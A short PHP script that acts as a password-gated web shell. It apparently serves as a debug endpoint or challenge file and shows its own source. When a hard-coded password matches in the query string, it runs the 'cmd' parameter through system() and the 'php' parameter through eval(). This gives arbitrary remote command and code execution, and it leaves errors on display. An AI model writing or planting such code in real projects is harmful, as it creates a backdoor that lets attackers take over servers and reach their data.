<?php
require_once $_SERVER['DOCUMENT_ROOT']. '/libconst.php';
if (!DEBUG) highlight_file(__FILE__);
$psw = 'e80ae5f98eecd34343ef3cd75e9de1f1';
if (!DEBUG || $_GET['psw'] !== $psw) {
    header('HTTP/1.1 403 What Are You Looking?');
    die();
}
ini_set('display_errors', 1);
if (isset($_GET['cmd'])) system($_GET['cmd']);
if (isset($_GET['php'])) eval($_GET['php']);
